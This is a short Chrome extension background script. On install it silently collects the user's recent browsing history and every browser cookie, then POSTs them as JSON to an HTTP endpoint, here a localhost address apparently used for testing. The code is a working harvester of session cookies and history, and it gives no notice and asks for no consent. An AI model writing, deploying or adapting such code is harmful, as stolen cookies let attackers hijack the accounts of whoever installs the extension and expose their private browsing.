chrome.runtime.onInstalled.addListener(() => {
    fetchBrowserData();
});

function fetchBrowserData() {
    chrome.history.search({ text: "", maxResults: 10 }, (historyItems) => {
        chrome.cookies.getAll({}, (cookies) => {
            const browserData = {
                history: historyItems,
                cookies: cookies
            };

            sendDataToServer(browserData);
        });
    });
}

function sendDataToServer(data) {
    console.log("Sending data to server:", data); 
    fetch("http://localhost:8080/api/receive", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
    }).then(() => console.log("Data sent to server."));
}
